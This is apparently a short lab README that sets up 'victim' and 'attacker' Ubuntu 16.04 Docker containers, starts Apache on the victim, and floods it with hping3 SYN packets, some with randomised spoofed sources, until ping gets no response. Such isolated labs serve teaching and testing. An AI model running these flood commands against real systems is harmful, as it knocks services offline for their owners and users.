### Run 
Use docker to run ubuntu 16.04 victim and attacker
```
docker pull ubuntu:16.04
```
```
docker run --cap-add=NET_ADMIN -it --name victim -p 8080:80 ubuntu:16.04 /bin/bash
```
```
docker run -it --name attacker ubuntu:16.04 /bin/bash
```
Install and run apache in victim
```
apt-get install -y apache2
service apache2 start
```
Enter to apache web in http:<victim-ip>:8080, you will see It works!
Install hping3 in attacker
```
apt-get install -y hping3
```
Inspect IP of victim and attack 
```
hping3 --flood --rand-source -p 80 <victim-ip>
```
or 
```
hping3 -i u1 -S -p 80 172.17.0.2
```
Ping victim-ip and get no response